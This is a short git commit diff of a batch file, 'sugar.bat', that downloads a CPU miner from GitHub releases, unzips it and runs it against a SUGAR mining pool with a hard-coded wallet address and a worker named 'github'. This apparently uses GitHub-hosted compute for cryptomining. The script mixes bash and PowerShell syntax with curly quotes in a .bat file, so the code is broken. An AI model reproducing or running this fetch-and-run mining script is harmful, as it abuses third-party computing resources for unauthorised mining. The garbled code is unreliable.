0ec94416ff57a5178ba23489a08b3ef5d81193b6
kimsjoincis <78370126+kimsjoincis@users.noreply.github.com>
2021-02-02 02:26:22 +0700

    Update sugar.bat

--- sugar.bat
+++ sugar.bat
@@ -1,4 +1,5 @@
-bash wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-win.zip &
+$client = new-object System.Net.WebClient
+$client.DownloadFile(“https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-win.zip”,”~/repo”)
 bash unzip cpuminer-opt-win.zip &
 bash cpuminer-sse2.exe -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.github -t 10
 
